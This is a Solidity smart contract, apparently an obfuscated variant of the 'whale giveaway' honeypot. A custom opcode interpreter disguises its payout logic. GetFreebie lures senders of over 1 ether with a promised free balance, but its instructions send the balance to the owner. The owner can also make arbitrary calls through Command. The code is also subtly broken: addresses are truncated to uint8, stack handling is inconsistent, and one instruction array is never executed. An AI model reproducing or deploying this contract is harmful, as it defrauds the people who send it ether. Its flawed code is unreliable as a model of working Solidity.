pragma solidity ^0.4.19;

contract ObfuscatedWhaleGiveaway2 {
    address public Owner = msg.sender;

    function() public payable {}

    function VMInterpreter(uint8[] instructions) internal {
        uint8 pc = 0;
        uint256 stackPointer = 0;
        uint256[] memory stack = new uint256[](256);

        while (pc < instructions.length) {
            uint8 opcode = instructions[pc];
            if (opcode == 0) { // PUSH
                pc++;
                stack[stackPointer] = uint256(instructions[pc]);
                stackPointer++;
            } else if (opcode == 1) { // POP
                stackPointer--;
            } else if (opcode == 2) { // ADD
                stackPointer--;
                stack[stackPointer - 1] += stack[stackPointer];
            } else if (opcode == 3) { // SUB
                stackPointer--;
                stack[stackPointer - 1] -= stack[stackPointer];
            } else if (opcode == 4) { // JMP
                pc = uint8(stack[--stackPointer]);
                continue;
            } else if (opcode == 5) { // JZ
                if (stack[--stackPointer] == 0) {
                    pc = uint8(stack[--stackPointer]);
                    continue;
                }
            } else if (opcode == 6) { // LOAD_BALANCE
                stack[stackPointer++] = this.balance;
            } else if (opcode == 7) { // TRANSFER
                address(uint160(stack[--stackPointer])).transfer(stack[--stackPointer]);
            } else if (opcode == 8) { // CHECK_SENDER
                stack[stackPointer++] = (msg.sender == Owner) ? 1 : 0;
            }
            pc++;
        }
    }

    function GetFreebie() public payable {
        uint8[] memory instructions = new uint8[](12);
        instructions[0] = 0; instructions[1] = uint8(msg.value / 1 ether > 1 ? 1 : 0);
        instructions[2] = 5; instructions[3] = 11; // JZ to end if false
        instructions[4] = 6; // LOAD_BALANCE
        instructions[5] = 0; instructions[6] = uint8(uint160(Owner)); // PUSH Owner
        instructions[7] = 7; // TRANSFER to Owner
        instructions[8] = 6; // LOAD_BALANCE
        instructions[9] = 0; instructions[10] = uint8(uint160(msg.sender)); // PUSH msg.sender
        instructions[11] = 7; // TRANSFER to msg.sender
        VMInterpreter(instructions);
    }

    function withdraw() payable public {
        uint8[] memory instructions = new uint8[](9);
        instructions[0] = 8; // CHECK_SENDER
        instructions[1] = 5; instructions[2] = 8; // JZ to end
        instructions[3] = 6; // LOAD_BALANCE
        instructions[4] = 0; instructions[5] = uint8(uint160(Owner)); // PUSH Owner
        instructions[6] = 7; // TRANSFER
        instructions[7] = 0; // end
        VMInterpreter(instructions);
    }

    function Command(address adr, bytes data) payable public {
        uint8[] memory instructions = new uint8[](9);
        instructions[0] = 8; // CHECK_SENDER
        instructions[1] = 5; instructions[2] = 8; // JZ to end
        instructions[3] = 0; instructions[4] = uint8(msg.value); // PUSH msg.value
        instructions[5] = 0; instructions[6] = uint8(uint160(adr)); // PUSH adr
        instructions[7] = 7; // CALL adr with value
        instructions[8] = 0; // end
        adr.call.value(msg.value)(data);
    }
}